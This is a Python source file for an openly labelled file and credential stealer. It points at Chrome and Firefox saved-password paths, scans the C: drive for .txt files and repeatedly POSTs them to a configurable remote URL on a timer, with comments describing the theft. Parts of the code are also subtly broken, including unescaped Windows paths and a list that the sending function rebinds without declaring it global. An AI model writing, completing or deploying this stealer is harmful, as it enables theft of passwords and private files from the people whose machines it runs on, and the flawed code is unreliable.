import os
import requests
import threading
from contextlib import ExitStack

URL = 'https://0.0.0.0' # the URL/IP to which you want to send the stolen files/information to
INTERVAL = 60.0 # Interval between sending files (in seconds). Don't make this too low because you're going to DDOS yourself.
USERNAME = os.getlogin()
GOOGLE_PASSWORDS = f'C:\Users\{USERNAME}\AppData\Local\Google\Chrome\User Data\Default' # location of Google passwords
FIREFOX_PASSWORDS = f'C:\Users\{USERNAME}\AppData\Roaming\Mozilla\Firefox\Profiles\logins.json' # location of Firefox passwords

#file_types = ['.txt'] # if checking for multiple file types
files_found = [GOOGLE_PASSWORDS,FIREFOX_PASSWORDS] # log files found.
# NOTE: Files of interest are already in list so they can be sent right at the start.

def file_search():
    for dir, sdirs, files in os.walk('C:\\'): # dir - directories, sdirs - subdirectories
        #print(f'directory: {dir}\n \ # for testing to show all files scanned
        #      subdirectories: {sdirs}\n \
        #      files: {files}')
        for file in files:
            #if any(type in file for type in file_types): # check for multiple file types of interest. if you want to use this, comment out the next line.
            if '.txt' in file: # check file type
                print(dir + '\\' + file) # for testing
                files_found.append([dir + '\\' + file]) # log the found file's address

def steal_files(): # steal files
    count = len(files_found) # Assume new files were added which you haven't sent yet and log how many you're sending so you know how many to remove later
    files_payload = {} # progressively add more files to the payload
    i = 1
    with ExitStack() as stack:
        for file in files_found[:count-1]:
            file_name = os.path.basename(file) # get the file name from the path
            f = stack.enter_context(open(file, 'rb')) # open the file in read-only mode binary
            files_payload[f"file{i}"] = (file_name, f) # make the payload for the file containing the file name and the file in binary and add it to the list of the payload
            i += 1 # add 1 to the counter so the file keys enumerate ex. {'file1:(..),file2:(..), and so on'}
        r = requests.post(URL, files=files_payload) # POST (send) the file
    if not r.ok:
        pass
    else:
        files_found = files_found[count-1:]
    threading.Timer(INTERVAL, steal_files).start() # start sending files again after the amount of seconds specified in INTERVAL


threading.Timer(INTERVAL, steal_files).start() # start sending files after the amount of seconds specified in INTERVAL

# NOTE about threading.Timer(): Each instance of threading.Timer() schedules the function to be played in n seconds in the background.
# Therefore, the first instance of threading.Timer() makes it run the first time, and by adding threading.Timer() into the function itself,
# it recursively repeats forever because each time the function runs it schedules itself to be ran again.

file_search()